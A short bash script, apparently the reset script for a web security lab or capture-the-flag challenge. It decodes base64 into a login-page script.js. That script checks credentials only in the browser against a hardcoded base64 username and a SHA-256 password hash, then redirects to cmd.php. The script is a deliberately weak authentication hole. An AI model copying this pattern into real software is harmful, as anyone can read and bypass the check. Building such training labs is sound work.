#!/bin/bash

# 定义 script.js 文件的路径
SCRIPT_PATH="/var/www/html/static/script.js"

# 重置 script.js 文件的内容
echo "O2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkZvcm0nKS5hZGRFdmVudExpc3RlbmVyKCdzdWJtaXQnLGZ1bmN0aW9uKGV2ZW50KXtldmVudC5wcmV2ZW50RGVmYXVsdCgpO2NvbnN0IHVzZXJuYW1lPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZScpLnZhbHVlO2NvbnN0IHBhc3N3b3JkPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZCcpLnZhbHVlO2NvbnN0IHZhbGlkVXNlcm5hbWVCYXNlNjQ9J2FIVmlkVzFoY25NPSc7Y29uc3QgdmFsaWRQYXNzd29yZEhhc2g9J2VmOTJiNzc4YmFmZTc3MWU4OTI0NWI4OWVjYmMwOGE0NGE0ZTE2NmMwNjY1OTkxMTg4MWYzODNkNDQ3M2U5NGYnO2NvbnN0IHVzZXJuYW1lQmFzZTY0PWJ0b2EodXNlcm5hbWUpO2NvbnN0IHBhc3N3b3JkSGFzaD1DcnlwdG9KUy5TSEEyNTYocGFzc3dvcmQpLnRvU3RyaW5nKCk7Y29uc29sZS5sb2codXNlcm5hbWVCYXNlNjQscGFzc3dvcmRIYXNoKTtpZih1c2VybmFtZUJhc2U2ND09PXZhbGlkVXNlcm5hbWVCYXNlNjQmJnBhc3N3b3JkSGFzaD09PXZhbGlkUGFzc3dvcmRIYXNoKXthbGVydCgnTG9naW4gc3VjY2Vzc2Z1bCEnKTt3aW5kb3cubG9jYXRpb24uaHJlZj0iLi9jbWQucGhwIn1lbHNle2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvck1lc3NhZ2UnKS5zdHlsZS5kaXNwbGF5PSdibG9jayd9fSk7Ow==" | base64 -d > $SCRIPT_PATH
